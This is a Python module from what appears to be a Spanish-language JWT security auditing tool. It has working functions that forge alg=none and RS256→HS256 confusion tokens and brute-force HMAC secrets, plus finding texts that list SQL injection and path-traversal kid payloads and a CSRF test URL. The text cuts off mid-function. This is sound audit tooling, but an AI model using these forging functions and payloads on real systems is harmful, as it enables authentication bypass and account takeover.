# © VampSecure Studios — VampSecure Labs Security Research Division
"""
_core.py — Lógica pura de auditoría JWT (sin I/O, sin rich, sin argparse)
"""

from __future__ import annotations

import base64
import hashlib
import hmac
import json
import time
import urllib.error
import urllib.parse
import urllib.request

from ._models import VERSION, TOOL_NAME, _COMMON_SECRETS, JWTComponents, Finding, AuditResult

# =============================================================================
# UTILIDADES BASE64URL
# =============================================================================

def _b64url_decode(s: str) -> bytes:
    """Decodifica un segmento base64url (sin padding estricto)."""
    s = s.replace("-", "+").replace("_", "/")
    pad = len(s) % 4
    if pad:
        s += "=" * (4 - pad)
    return base64.b64decode(s)


def _b64url_encode(data: bytes) -> str:
    """Codifica bytes en base64url sin padding."""
    return base64.b64encode(data).decode().replace("+", "-").replace("/", "_").rstrip("=")


# =============================================================================
# OBTENCIÓN DE CLAVE PÚBLICA DESDE JWKS
# =============================================================================

def _jwk_rsa_to_pem(n_b64: str, e_b64: str) -> str | None:
    """
    Construye una clave pública RSA en formato PEM a partir de los componentes
    n y e de un JWK (base64url).

    Intenta primero con la biblioteca `cryptography` si está disponible;
    si no, construye el SubjectPublicKeyInfo (DER → PEM) manualmente sin
    dependencias externas.
    """
    try:
        from cryptography.hazmat.backends import default_backend
        from cryptography.hazmat.primitives.asymmetric.rsa import RSAPublicNumbers
        from cryptography.hazmat.primitives.serialization import Encoding, PublicFormat

        def _decode_int(b64: str) -> int:
            b = base64.urlsafe_b64decode(b64 + "==")
            return int.from_bytes(b, "big")

        pub = RSAPublicNumbers(
            _decode_int(e_b64), _decode_int(n_b64)
        ).public_key(default_backend())
        return pub.public_bytes(Encoding.PEM, PublicFormat.SubjectPublicKeyInfo).decode()
    except ImportError:
        pass
    except Exception:
        return None

    try:
        def _b64url_raw(s: str) -> bytes:
            s = s.replace("-", "+").replace("_", "/")
            s += "=" * ((-len(s)) % 4)
            return base64.b64decode(s)

        def _asn1_tlv(tag: int, value: bytes) -> bytes:
            ln = len(value)
            if ln < 128:
                length = bytes([ln])
            elif ln < 256:
                length = bytes([0x81, ln])
            else:
                length = bytes([0x82, ln >> 8, ln & 0xFF])
            return bytes([tag]) + length + value

        def _asn1_int(raw: bytes) -> bytes:
            raw = raw.lstrip(b"\x00") or b"\x00"
            if raw[0] & 0x80:
                raw = b"\x00" + raw
            return _asn1_tlv(0x02, raw)

        n_bytes = _b64url_raw(n_b64)
        e_bytes = _b64url_raw(e_b64)

        key_seq = _asn1_tlv(0x30, _asn1_int(n_bytes) + _asn1_int(e_bytes))
        bit_string = _asn1_tlv(0x03, b"\x00" + key_seq)
        alg_id = _asn1_tlv(0x30,
            b"\x06\x09\x2a\x86\x48\x86\xf7\x0d\x01\x01\x01"
            b"\x05\x00"
        )
        spki = _asn1_tlv(0x30, alg_id + bit_string)

        pem_b64 = base64.b64encode(spki).decode()
        return "-----BEGIN PUBLIC KEY-----\n" + pem_b64 + "\n-----END PUBLIC KEY-----\n"
    except Exception:
        return None


def fetch_jwks_public_key(issuer_or_url: str) -> str | None:
    """
    Obtiene la primera clave pública RSA del JWKS de un servidor OIDC/OAuth 2.0.

    Proceso de descubrimiento
    -------------------------
    1. Si la URL ya termina en .json, se usa directamente como JWKS.
    2. Intenta {issuer}/.well-known/jwks.json
    3. Intenta {issuer}/.well-known/openid-configuration → extrae jwks_uri → descarga JWKS
    """
    def _fetch_json(url: str) -> dict | None:
        try:
            req = urllib.request.Request(
                url, headers={"User-Agent": f"vamp-jwt-audit/{VERSION}"}
            )
            with urllib.request.urlopen(req, timeout=5) as resp:
                return json.loads(resp.read().decode("utf-8", errors="replace"))
        except Exception:
            return None

    def _extract_rsa_pem(jwks: dict) -> str | None:
        for key in jwks.get("keys", []):
            if key.get("kty") == "RSA" and "n" in key and "e" in key:
                if key.get("use", "sig") == "sig":
                    return _jwk_rsa_to_pem(key["n"], key["e"])
        return None

    base = issuer_or_url.rstrip("/")

    if base.endswith(".json"):
        data = _fetch_json(base)
        if data and "keys" in data:
            return _extract_rsa_pem(data)
        return None

    data = _fetch_json(f"{base}/.well-known/jwks.json")
    if data and "keys" in data:
        pem = _extract_rsa_pem(data)
        if pem:
            return pem

    oidc = _fetch_json(f"{base}/.well-known/openid-configuration")
    if oidc and "jwks_uri" in oidc:
        jwks_data = _fetch_json(oidc["jwks_uri"])
        if jwks_data and "keys" in jwks_data:
            return _extract_rsa_pem(jwks_data)

    return None


# =============================================================================
# DECODIFICACIÓN JWT
# =============================================================================

def decode_jwt(token: str) -> JWTComponents:
    """
    Decodifica un JWT en sus tres componentes sin verificar la firma.
    Acepta tokens con o sin el prefijo 'Bearer '.
    """
    token = token.strip()
    if token.lower().startswith("bearer "):
        token = token[7:].strip()

    parts = token.split(".")
    if len(parts) < 2:
        return JWTComponents(raw=token, error=f"Formato inválido: se esperan 3 partes, encontradas {len(parts)}")

    try:
        header  = json.loads(_b64url_decode(parts[0]))
        payload = json.loads(_b64url_decode(parts[1]))
        sig_b64 = parts[2] if len(parts) > 2 else ""
        return JWTComponents(raw=token, header=header, payload=payload, sig_b64=sig_b64, parts=parts)
    except Exception as exc:
        return JWTComponents(raw=token, error=f"Error decodificando token: {exc}")


# =============================================================================
# ATAQUE ALG=NONE
# =============================================================================

def craft_alg_none_token(components: JWTComponents) -> str:
    """Construye un token manipulado con alg=none y firma vacía."""
    new_header  = {**components.header, "alg": "none"}
    header_enc  = _b64url_encode(json.dumps(new_header, separators=(",", ":")).encode())
    payload_enc = _b64url_encode(json.dumps(components.payload, separators=(",", ":")).encode())
    return f"{header_enc}.{payload_enc}."


# =============================================================================
# ATAQUE RS256 → HS256 (CONFUSIÓN DE ALGORITMO)
# =============================================================================

def craft_rs256_hs256_token(components: JWTComponents, pubkey_pem: str) -> str | None:
    """Genera un token HS256 firmado con la clave pública RSA como secreto HMAC."""
    new_header  = {**components.header, "alg": "HS256"}
    header_enc  = _b64url_encode(json.dumps(new_header, separators=(",", ":")).encode())
    payload_enc = _b64url_encode(json.dumps(components.payload, separators=(",", ":")).encode())
    message     = f"{header_enc}.{payload_enc}".encode()

    sig = hmac.new(pubkey_pem.encode(), message, hashlib.sha256).digest()
    return f"{header_enc}.{payload_enc}.{_b64url_encode(sig)}"


# =============================================================================
# FUERZA BRUTA DE SECRETO HMAC
# =============================================================================

def brute_force_secret(
    components: JWTComponents,
    extra_wordlist: list[str] | None = None,
) -> str | None:
    """
    Intenta recuperar el secreto HMAC de un token HS256/HS384/HS512.
    Prueba la lista integrada de secretos comunes y la wordlist externa.
    """
    alg = components.header.get("alg", "").upper()
    if alg not in ("HS256", "HS384", "HS512"):
        return None

    hashfn_map = {"HS256": hashlib.sha256, "HS384": hashlib.sha384, "HS512": hashlib.sha512}
    hashfn = hashfn_map[alg]

    if len(components.parts) < 3 or not components.sig_b64:
        return None

    try:
        expected_sig = _b64url_decode(components.sig_b64)
    except Exception:
        return None

    message = f"{components.parts[0]}.{components.parts[1]}".encode()
    candidates = list(_COMMON_SECRETS) + (extra_wordlist or [])

    for secret in candidates:
        try:
            sig = hmac.new(secret.encode("utf-8", errors="replace"), message, hashfn).digest()
            if hmac.compare_digest(sig, expected_sig):
                return secret
        except Exception:
            continue

    return None


# =============================================================================
# ANÁLISIS DE CLAIMS
# =============================================================================

def analyze_claims(components: JWTComponents) -> list[Finding]:
    """
    Analiza los claims del payload en busca de problemas de seguridad.

    Checks: exp ausente/expirado/largo, nbf futuro, iss/aud ausentes,
    roles privilegiados, claims PII, kid con path traversal/SQLi.
    """
    now = int(time.time())
    p   = components.payload
    findings: list[Finding] = []

    exp = p.get("exp")
    if exp is None:
        findings.append(Finding(
            severity    = "HIGH",
            title       = "Claim 'exp' ausente — token sin expiración",
            description = "El token no tiene claim de expiración (exp). Un token sin expiración "
                          "permanece válido indefinidamente y no puede ser invalidado por rotación.",
            remediation = "Añadir el claim 'exp' con una vigencia máxima acorde al caso de uso "
                          "(p. ej. 15 minutos para tokens de sesión, 1 hora para API keys de corta vida).",
        ))
    elif isinstance(exp, (int, float)) and exp < now:
        elapsed = now - int(exp)
        findings.append(Finding(
            severity    = "MEDIUM",
            title       = "Token EXPIRADO",
            description = f"El token expiró hace {elapsed} segundos (exp={exp}, ahora={now}). "
                          "Si el servidor lo acepta, hay un bug de validación de expiración.",
            evidence    = f"exp={exp}  now={now}  delta={elapsed}s",
            remediation = "Verificar que el servidor rechaza tokens expirados. "
                          "Implementar validación de 'exp' con margen de reloj máximo de 60 segundos.",
        ))
    elif isinstance(exp, (int, float)):
        ttl = int(exp) - now
        if ttl > 86400:
            findings.append(Finding(
                severity    = "LOW",
                title       = f"Vigencia excesiva del token: {ttl // 3600:.0f} horas",
                description = f"El token tiene una vigencia de {ttl // 3600:.0f} horas. "
                              "Una vigencia larga aumenta el riesgo de uso indebido si el token es comprometido.",
                evidence    = f"exp={exp}  TTL restante={ttl}s ({ttl // 3600:.0f}h)",
                remediation = "Reducir la vigencia del token: 15 min para sesiones de usuario, "
                              "1h para API keys, 24h máximo para tokens de refresh.",
            ))

    nbf = p.get("nbf")
    if nbf and isinstance(nbf, (int, float)) and int(nbf) > now + 60:
        findings.append(Finding(
            severity    = "MEDIUM",
            title       = "Token con nbf en el futuro — no válido todavía",
            description = f"El claim 'nbf' (not before) es {int(nbf) - now} segundos en el futuro. "
                          "El token no debería ser válido aún.",
            evidence    = f"nbf={nbf}  now={now}  delta={int(nbf) - now}s",
            remediation = "Si el servidor acepta este token antes de nbf, hay un bug de validación. "
                          "Verificar que la lógica de validación comprueba: now >= nbf.",
        ))

    if not p.get("iss"):
        findings.append(Finding(
            severity    = "LOW",
            title       = "Claim 'iss' (issuer) ausente",
            description = "Sin claim iss no es posible verificar que el token fue emitido por "
                          "el servidor esperado, facilitando ataques de replay entre servicios.",
            remediation = "Añadir el claim 'iss' con el identificador único del emisor y validarlo en cada petición.",
        ))
    if not p.get("aud"):
        findings.append(Finding(
            severity    = "LOW",
            title       = "Claim 'aud' (audience) ausente",
            description = "Sin claim aud el token puede ser reutilizado en otros servicios "
                          "que confíen en el mismo issuer.",
            remediation = "Añadir el claim 'aud' con el identificador del servicio receptor y validarlo.",
        ))

    PRIVILEGED_ROLES = {"admin", "root", "superuser", "super_user", "superadmin",
                        "administrator", "owner", "god", "system", "internal"}
    for claim in ("role", "roles", "scope", "permissions", "groups", "authorities"):
        val = p.get(claim)
        if not val:
            continue
        val_lower = json.dumps(val).lower()
        found = [r for r in PRIVILEGED_ROLES if r in val_lower]
        if found:
            findings.append(Finding(
                severity    = "HIGH",
                title       = f"Privilegio elevado en claim '{claim}': {found}",
                description = f"El claim '{claim}' contiene roles/scopes de alto privilegio: {found}. "
                              "Si el servidor no valida estos claims contra la BD, pueden ser manipulados.",
                evidence    = f"{claim}={json.dumps(val)!r}",
                remediation = "Los roles/permisos deben resolverse siempre desde la BD en cada petición, "
                              "nunca confiar exclusivamente en los claims del token.",
            ))

    PII_CLAIMS = {"email", "phone", "ssn", "tax_id", "dni", "nif", "address",
                  "date_of_birth", "dob", "credit_card", "ip_address"}
    pii_found = [c for c in p if c.lower() in PII_CLAIMS]
    if pii_found:
        findings.append(Finding(
            severity    = "MEDIUM",
            title       = f"Datos PII en payload JWT: {pii_found}",
            description = f"El payload contiene claims con datos personales ({pii_found}). "
                          "El payload JWT es sólo codificado en base64, no cifrado, y puede ser leído "
                          "por cualquier intermediario con acceso al token.",
            evidence    = f"Claims PII detectados: {pii_found}",
            remediation = "Minimizar la información en el payload. Usar un claim opaco (jti/sub) "
                          "como referencia y resolver datos sensibles en el servidor. "
                          "Si es necesario incluir PII, usar JWE (JSON Web Encryption) en lugar de JWT.",
        ))

    kid = components.header.get("kid", "")
    if kid and any(c in str(kid) for c in ("../", "..\\", ";", "' OR", "/*", "UNION")):
        findings.append(Finding(
            severity    = "CRITICAL",
            title       = f"Claim 'kid' con posible path traversal / inyección: {kid!r}",
            description = "El claim 'kid' (key ID) contiene caracteres que pueden usarse para path "
                          "traversal o inyección SQL si el servidor usa kid para seleccionar la clave "
                          "de verificación desde el sistema de ficheros o la BD.",
            evidence    = f"kid={kid!r}",
            remediation = "Validar que 'kid' es un identificador alfanumérico fijo de una lista blanca. "
                          "Nunca usar kid directamente en rutas de ficheros o consultas SQL.",
        ))

    return findings


# =============================================================================
# ANÁLISIS DE CABECERA
# =============================================================================

def analyze_header(components: JWTComponents) -> list[Finding]:
    """Analiza la cabecera del JWT en busca de algoritmos inseguros y configuraciones débiles."""
    findings: list[Finding] = []
    alg = components.header.get("alg", "")

    if alg.lower() == "none":
        findings.append(Finding(
            severity    = "CRITICAL",
            title       = "Algoritmo 'none' declarado en la cabecera",
            description = "El token declara alg=none, lo que significa que no tiene firma. "
                          "Si el servidor lo acepta, cualquier atacante puede modificar el payload "
                          "y eliminar la firma sin que sea detectado.",
            evidence    = f"alg={alg!r}",
            remediation = "El servidor debe rechazar EXPLÍCITAMENTE tokens con alg=none. "
                          "Usar una lista blanca de algoritmos aceptables (p. ej. solo HS256 o RS256).",
        ))
    elif alg.upper() in ("HS256", "HS384", "HS512"):
        findings.append(Finding(
            severity    = "INFO",
            title       = f"Algoritmo simétrico {alg} — validar longitud del secreto",
            description = f"Se usa {alg} (HMAC). La seguridad depende de la longitud y entropía del secreto. "
                          "Un secreto débil o de diccionario puede recuperarse con fuerza bruta.",
            remediation = f"Usar un secreto aleatorio de al menos 256 bits (32 bytes) para {alg}. "
                          "Para mayor seguridad asimétrica, considerar RS256/ES256 con claves de 2048/256 bits.",
        ))
    elif alg.upper() in ("RS256", "RS384", "RS512", "ES256", "ES384", "ES512", "PS256", "PS384", "PS512"):
        findings.append(Finding(
            severity    = "INFO",
            title       = f"Algoritmo asimétrico {alg} — verificar vulnerabilidad RS256→HS256",
            description = f"Se usa {alg} (clave pública/privada). Verificar si el servidor acepta HS256 "
                          "firmado con la clave pública como secreto (ataque de confusión de algoritmo).",
            remediation = "Fijar el algoritmo permitido en la configuración del servidor y rechazar "
                          "cualquier token cuyo 'alg' difiera del esperado.",
        ))

    for claim in ("jku", "x5u"):
        val = components.header.get(claim)
        if val:
            findings.append(Finding(
                severity    = "CRITICAL",
                title       = f"Claim '{claim}' presente — posible inyección de clave JWT",
                description = f"La cabecera incluye '{claim}={val}'. Si el servidor descarga la clave "
                              f"desde esta URL para verificar el token, un atacante puede apuntar a un "
                              f"servidor controlado por él y emitir tokens arbitrarios.",
                evidence    = f"{claim}={val!r}",
                remediation = f"El servidor nunca debe seguir URLs en '{claim}' de forma automática. "
                              "Fijar la URL/clave en la configuración interna del servidor.",
            ))

    if "jwk" in components.header:
        findings.append(Finding(
            severity    = "CRITICAL",
            title       = "Claim 'jwk' inline — clave incrustada en el token",
            description = "La cabecera incluye una clave JWK inline. Un atacante puede incluir su propia "
                          "clave pública en el header y firmar el token con la clave privada correspondiente. "
                          "Si el servidor usa la clave del header sin verificarla contra una fuente de confianza, "
                          "el atacante puede forjar tokens válidos.",
            evidence    = "jwk=" + repr(json.dumps(components.header["jwk"]))[:80] + "...",
            remediation = "Ignorar el claim 'jwk' del header y usar únicamente claves precargadas "
                          "de la configuración del servidor.",
        ))

    return findings


# =============================================================================
# DETECCIÓN DE FRAMEWORKS VULNERABLES
# =============================================================================

def detect_vulnerable_frameworks(
    components: JWTComponents,
    check_url: str | None = None,
) -> list[Finding]:
    """
    Detecta indicadores de frameworks con vulnerabilidades JWT conocidas.
    CVE-2026-22817 (Hono) y CVE-2026-33757 (OpenBao/Vault).
    """
    findings: list[Finding] = []
    iss = str(components.payload.get("iss", ""))
    iss_lower = iss.lower()

    response_headers: dict[str, str] = {}
    if check_url:
        try:
            req = urllib.request.Request(
                check_url,
                headers={"User-Agent": f"vamp-jwt-audit/{VERSION}"},
            )
            with urllib.request.urlopen(req, timeout=5) as resp:
                response_headers = {k.lower(): v for k, v in resp.headers.items()}
        except Exception:
            pass

    powered_by    = response_headers.get("x-powered-by", "").lower()
    vault_header  = response_headers.get("x-vault-request", "").lower()

    hono_detected    = "hono" in powered_by
    openbao_detected = (
        vault_header == "true"
        or any(s in iss_lower for s in ("vault", "openbao", "/auth/"))
    )

    if hono_detected:
        findings.append(Finding(
            severity    = "HIGH",
            title       = "[JWT-FRAME-001] Framework Hono detectado — posible CVE-2026-22817",
            description = (
                "El endpoint responde con la cabecera 'X-Powered-By: Hono'. "
                "Las versiones de Hono anteriores a 4.11.4 son vulnerables a confusión "
                "de algoritmo JWT (CVE-2026-22817): la validación acepta tokens HS256 "
                "firmados con la clave pública RSA como secreto HMAC. "
                "Usar el token RS256→HS256 generado para verificar si el servidor es vulnerable."
            ),
            evidence    = (
                f"X-Powered-By: {response_headers.get('x-powered-by', 'Hono')}  "
                f"URL: {check_url}"
            ),
            remediation = (
                "Actualizar Hono a v4.11.4 o superior.\n"
                "Fijar el algoritmo JWT aceptado (solo RS256 o solo HS256, nunca ambos).\n"
                "Ref: CVE-2026-22817 — github.com/honojs/hono/security/advisories"
            ),
        ))

    if openbao_detected:
        _base = (check_url or iss).rstrip("/")
        test_url = f"{_base}/v1/auth/oidc/oidc/callback?code=TEST&state=TEST&callback_mode=direct"

        findings.append(Finding(
            severity    = "CRITICAL",
            title       = "[JWT-OPENBAO-001] OpenBao/Vault detectado — posible CVE-2026-33757",
            description = (
                "Se detecta un emisor de tokens OpenBao o HashiCorp Vault. "
                "CVE-2026-33757 afecta al endpoint OIDC con callback_mode=direct: "
                "el servidor procesa el callback OIDC sin solicitar confirmación al usuario, "
                "permitiendo a un atacante forzar el inicio de sesión de la víctima "
                "en la cuenta del atacante (login CSRF / account takeover). "
                "Prueba: enviar GET al endpoint de prueba y observar si se procesa "
                "sin autenticación previa."
            ),
            evidence    = (
                f"iss={iss or 'N/A'}"
                + ("  X-Vault-Request: true" if vault_header == "true" else "")
                + f"\nURL de prueba: {test_url}"
            ),
            remediation = (
                "Actualizar OpenBao/Vault a la versión parcheada.\n"
                "Deshabilitar o restringir el endpoint OIDC callback_mode=direct.\n"
                "Añadir verificación de estado CSRF en el flujo OIDC.\n"
                "Ref: CVE-2026-33757"
            ),
        ))

    return findings


# =============================================================================
# ATAQUE KID INJECTION (PATH TRAVERSAL / SQL INJECTION)
# =============================================================================

def _test_kid_injection(header: dict, findings: list[Finding]) -> None:
    """Analiza el campo 'kid' del header JWT en busca de path traversal y SQL injection."""
    kid = header.get("kid")
    if kid is None:
        return

    kid_str = str(kid)

    if kid_str.strip().isdigit():
        findings.append(Finding(
            severity    = "INFO",
            title       = "kid numérico — posible SQL injection si el verificador consulta DB",
            description = (
                f"El campo 'kid' tiene un valor numérico puro: {kid_str!r}. "
                "Si el servidor construye una consulta del tipo "
                "\"SELECT clave FROM claves WHERE id=<kid>\", un atacante que "
                "controle el kid podría inyectar SQL para seleccionar una clave "
                "arbitraria o causar un error que bypasee la verificación. "
                "Valores de ataque sugeridos para prueba manual: "
                "kid='1 OR 1=1', kid='1; DROP TABLE keys--'."
            ),
            evidence    = f"kid={kid_str!r}  (valor numérico puro)",
            remediation = (
                "Validar que kid es un UUID o identificador alfanumérico fijo de una lista blanca. "
                "Si se usa en consultas SQL, emplear consultas parametrizadas (placeholders). "
                "Nunca construir SQL dinámico con el valor raw del kid."
            ),
        ))
        return

    CHARS_SOSPECHOSOS = ("../", "..\\", "'", '"', ";")
    encontrados = [c for c in CHARS_SOSPECHOSOS if c in kid_str]
    if encontrados:
        findings.append(Finding(
            severity    = "MEDIUM",
            title       = f"Campo 'kid' con caracteres sospechosos de path traversal/SQLi: {encontrados}",
            description = (
                f"El campo 'kid' del header JWT contiene caracteres indicadores de "
                f"path traversal o SQL injection: {encontrados!r}. "
                "Si el servidor usa kid directamente para construir rutas de ficheros "
                "o consultas SQL, puede ser vulnerable. "
                "Vectores conocidos: 'kid=../../dev/null' causa firma con clave vacía; "
                "'kid=\\' OR \\'1\\'=\\'1' inyecta SQL en el verificador."
            ),
            evidence    = f"kid={kid_str!r}  Caracteres detectados: {encontrados!r}",
            remediation = (
                "Validar que 'kid' solo contiene caracteres alfanuméricos, guiones o guiones bajos. "
                "Usar una lista blanca de identificadores de clave permitidos. "
                "Nunca usar kid directamente en rutas de sistema de ficheros ni consultas SQL sin sanear."
            ),
        ))


# =============================================================================
# ATAQUE jku/x5u INJECTION (JWKS SPOOFING)
# =============================================================================

def _test_jku_injection(header: dict, findings: list[Finding]) -> None:
    """Analiza los campos de URL de clave en el header JWT: jku, x5u, x5c."""
    jku = header.get("jku")
    if jku:
        findings.append(Finding(
            severity    = "HIGH",
            title       = "Header jku presente — posible JWKS spoofing",
            description = (
                f"La cabecera JWT incluye el campo 'jku' con valor: {str(jku)!r}. "
                "El campo jku (JWK Set URL) indica al servidor la URL desde la que "
                "debe descargar las claves públicas para verificar el token. "
                "Un atacante puede forjar un token con jku apuntando a un servidor "
                "controlado por él, haciendo que el servidor descargue y confíe en "
                "una clave pública del atacante — JWKS spoofing."
            ),
            evidence    = f"jku={str(jku)!r}",
            remediation = (
                "El servidor NUNCA debe seguir el campo jku del header automáticamente. "
                "La URL del JWKS debe estar fijada en la configuración del servidor. "
                "Si el servidor soporta jku, validar que la URL está en una lista blanca "
                "de dominios permitidos antes de descargar las claves."
            ),
        ))

    x5u = header.get("x5u")
    if x5u:
        findings.append(Finding(
            severity    = "HIGH",
            title       = "Header x5u presente — posible X.509 spoofing",
            description = (
                f"La cabecera JWT incluye el campo 'x5u' con valor: {str(x5u)!r}. "
                "El campo x5u (X.509 URL) indica al servidor la URL desde la que "
                "descargar la cadena de certificados para verificar el token. "
                "Si el servidor sigue esta URL sin validarla, un atacante puede "
                "proveer su propio certificado X.509 auto-firmado — X.509 URL spoofing."
            ),
            evidence    = f"x5u={str(x5u)!r}",
            remediation = (
                "El servidor no debe seguir el campo x5u automáticamente. "
                "Fijar el certificado o la CA de confianza en la configuración del servidor. "
                "Si se soporta x5u, validar que la URL está en una lista blanca estricta."
            ),
        ))

    x5c = header.get("x5c")
    if x5c:
        num_certs = len(x5c) if isinstance(x5c, list) else 1
        findings.append(Finding(
            severity    = "MEDIUM",
            title       = "Header x5c presente — verificar que la clave no es autocontrolada",
            description = (
                "La cabecera JWT incluye el campo 'x5c' con una cadena de certificados "
                "X.509 incrustada directamente en el token. "
                "Si el servidor usa la clave pública del certificado 'x5c' para verificar "
                "el token sin validar que el certificado fue emitido por una CA de confianza, "
                "el atacante puede auto-firmar el token con su propia clave privada e incluir "
                "el certificado correspondiente en x5c — bypass de verificación de firma."
            ),
            evidence    = f"x5c presente: {num_certs} certificado(s) incrustado(s)",
            remediation = (
                "Verificar que los certificados en x5c están firmados por una CA incluida en la "
                "lista de confianza del servidor. No confiar en el certificado de x5c sin validación "
                "de cadena de certificados completa. Preferir fijar las claves públicas en la "
                "configuración del servidor en lugar de aceptarlas del token."
            ),
        ))


# =============================================================================
# ANÁLISIS DE FLUJO OAUTH 2.0
# =============================================================================

def analyze_oauth_url(url: str) -> list[Finding]:
    """
    Analiza una URL de autorización OAuth 2.0 en busca de problemas de seguridad.
    No realiza ninguna petición de red: solo parsea el URL con urllib.parse.

    Checks: state (CSRF), code_challenge (PKCE), response_type=token (flujo implícito),
    redirect_uri ausente, scope permisivo.
    """
    hallazgos: list[Finding] = []

    try:
        parsed = urllib.parse.urlparse(url)
        params = urllib.parse.parse_qs(parsed.query, keep_blank_values=True)
    except Exception as exc:
        hallazgos.append(Finding(
            severity    = "INFO",
            title       = "URL OAuth inválida o no parseable",
            description = f"No se pudo parsear el URL de autorización OAuth: {exc}",
            evidence    = url[:200],
        ))
        return hallazgos

    if "state" not in params:
        hallazgos.append(Finding(
            severity    = "CRITICAL",
            title       = "[OAUTH] Parámetro 'state' ausente — riesgo CSRF",
            description = (
                "El URL de autorización OAuth no incluye el parámetro 'state'. "
                "Este parámetro es el mecanismo anti-CSRF del flujo OAuth 2.0: "
                "sin él, un atacante puede engañar al usuario para que complete "
                "un flujo OAuth malicioso, pudiendo vincular la cuenta de la víctima "
                "con la cuenta del atacante (CSRF → Account Takeover)."
            ),
            evidence    = url[:300],
            remediation = (
                "Generar un valor 'state' aleatorio e impredecible antes de redirigir:\n"
                "  state = secrets.token_urlsafe(32)\n"
                "  session['oauth_state'] = state\n"
                "Verificar que el 'state' recibido en el callback coincide con el de la sesión.\n"
                "Ref: RFC 6749 §10.12 — CSRF"
            ),
        ))
    else:
        state_val = params["state"][0]
        if len(state_val) < 8:
            hallazgos.append(Finding(
                severity    = "HIGH",
                title       = "[OAUTH] Parámetro 'state' demasiado corto (posible valor fijo)",
                description = (
                    f"El valor del parámetro 'state' ({state_val!r}) es muy corto ({len(state_val)} chars). "
                    "Un valor fijo o predecible no proporciona protección CSRF real."
                ),
                evidence    = f"state={state_val}",
                remediation = "Usar un valor 'state' de al menos 32 bytes aleatorios (secrets.token_urlsafe(32)).",
            ))

    response_type = params.get("response_type", [""])[0].lower()
    if response_type == "code" and "code_challenge" not in params:
        hallazgos.append(Finding(
            severity    = "HIGH",
            title       = "[OAUTH] PKCE (code_challenge) ausente — interceptación del código posible",
            description = (
                "El flujo de código de autorización no usa PKCE (Proof Key for Code Exchange). "
                "Sin PKCE, un atacante que intercepte el código de autorización "
                "(por ej. en apps móviles mediante un URI scheme malicioso) puede canjearlo "
                "por tokens de acceso sin conocer el secreto del cliente."
            ),
            evidence    = url[:300],
            remediation = (
                "Implementar PKCE en el cliente:\n"
                "  code_verifier  = secrets.token_urlsafe(64)\n"
                "  code_challenge = base64url(sha256(code_verifier))\n"
                "Añadir code_challenge y code_challenge_method=S256 al URL de autorización.\n"
                "Ref: RFC 7636 — PKCE para clientes públicos"
            ),
        ))

    if response_type == "token":
        hallazgos.append(Finding(
            severity    = "HIGH",
            title       = "[OAUTH] Flujo implícito (response_type=token) — token expuesto en URL",
            description = (
                "El URL de autorización usa response_type=token, lo que corresponde al "
                "flujo implícito de OAuth 2.0, obsoleto y desaconsejado por la RFC 9700 y "
                "las guías de seguridad actuales (OAuth 2.0 Security BCP).\n"
                "Riesgos:\n"
                "  · El access_token aparece en el fragment URI (#) de la URL de redirección\n"
                "  · Queda expuesto en el historial del navegador, logs del proxy y Referer\n"
                "  · Un script XSS en la página de callback puede leer el token desde location.hash\n"
                "  · No soporta refresh tokens"
            ),
            evidence    = f"response_type={response_type}  URL: {url[:200]}",
            remediation = (
                "Migrar al flujo de código de autorización con PKCE (response_type=code + code_challenge).\n"
                "Para SPAs: usar código + PKCE en lugar del flujo implícito.\n"
                "Para apps móviles: usar código + PKCE con redirect a localhost o URI scheme nativo.\n"
                "Ref: RFC 9700 §2.1.2 — flujo implícito desaconsejado"
            ),
        ))

    if "redirect_uri" not in params:
        hallazgos.append(Finding(
            severity    = "MEDIUM",
            title       = "[OAUTH] redirect_uri ausente en el URL de autorización",
            description = (
                "El URL de autorización no incluye el parámetro redirect_uri. "
                "Aunque el servidor puede tener un URI de redirección registrado por defecto, "
                "su ausencia en el request impide verificar que el cliente está solicitando "
                "una redirección a un destino conocido y registrado."
            ),
            evidence    = url[:200],
            remediation = "Incluir siempre redirect_uri explícitamente y verificar que coincide con el registrado.",
        ))

    scope_val = params.get("scope", [""])[0].lower()
    peligrosos = [s for s in ["admin", "write:*", "read:*", "*", "root", "superuser"]
                  if s in scope_val]
    if peligrosos:
        hallazgos.append(Finding(
            severity    = "INFO",
            title       = f"[OAUTH] Scopes potencialmente permisivos: {', '.join(peligrosos)}",
            description = (
                f"El URL de autorización solicita los siguientes scopes: {scope_val!r}. "
                "Algunos de ellos pueden otorgar permisos excesivos al cliente OAuth."
            ),
            evidence    = f"scope={scope_val}",
            remediation = "Aplicar el principio de mínimo privilegio: solicitar solo los scopes estrictamente necesarios.",
        ))

    return hallazgos


# =============================================================================
# MOTOR PRINCIPAL DE AUDITORÍA
# =============================================================================

def audit_token(
    token: str,
    wordlist: list[str] | None = None,
    pubkey_pem: str | None = None,
    jwks_url: str | None = None,
) -> AuditResult:
    """
    Ejecuta la auditoría completa de un JWT.

    Fases
    -----
    1. Decodificación sin verificación
    2. Análisis de cabecera (algoritmo, jku/x5u/jwk)
    3. Análisis de claims (exp, nbf, iat, roles, PII, kid)
    4. Construcción de token alg=none manipulado
    5. Fuerza bruta de secreto HMAC (wordlist integrada + externa)
    6. Construcción de token RS256→HS256 (si --pubkey)
    6b. Obtención de clave JWKS real y confusión RS256→HS256 (CVE-2026-22817)
    7. Detección de frameworks vulnerables (Hono / OpenBao, CVE-2026-22817/33757)
    """
    result = AuditResult(token=token)

    components = decode_jwt(token)
    result.components = components
    if components.error:
        result.findings.append(Finding(
            severity="CRITICAL",
            title="Error de decodificación — token malformado",
            description=components.error,
        ))
        return result

    result.findings.extend(analyze_header(components))
    result.findings.extend(analyze_claims(components))
    _test_kid_injection(components.header, result.findings)
    _test_jku_injection(components.header, result.findings)

    payload = components.payload
    exp = payload.get("exp")
    iat = payload.get("iat")
    if exp is not None and iat is not None:
        try:
            vida_seg = int(exp) - int(iat)
            if 0 < vida_seg <= 3600 and "refresh_token" not in payload:
                result.findings.append(Finding(
                    severity    = "LOW",
                    title       = "[OAUTH] Token con vigencia corta sin refresh_token — posible flujo implícito",
                    description = (
                        f"El token tiene una vigencia de {vida_seg // 60} minutos (exp-iat={vida_seg}s) "
                        "y no contiene claim 'refresh_token'. Este patrón es característico de tokens "
                        "emitidos mediante el flujo implícito de OAuth 2.0, que devuelve el access_token "
                        "directamente en la URL de redirección, exponiéndolo a robo via historial "
                        "del navegador, logs de proxy o ataques XSS sobre la URL de callback.\n"
                        "Nota: este hallazgo es indicativo, no determinista. "
                        "Usar --oauth-url para analizar el URL de autorización directamente."
                    ),
                    evidence    = f"exp={exp}  iat={iat}  vigencia={vida_seg}s ({vida_seg // 60}min)  sin refresh_token",
                    remediation = (
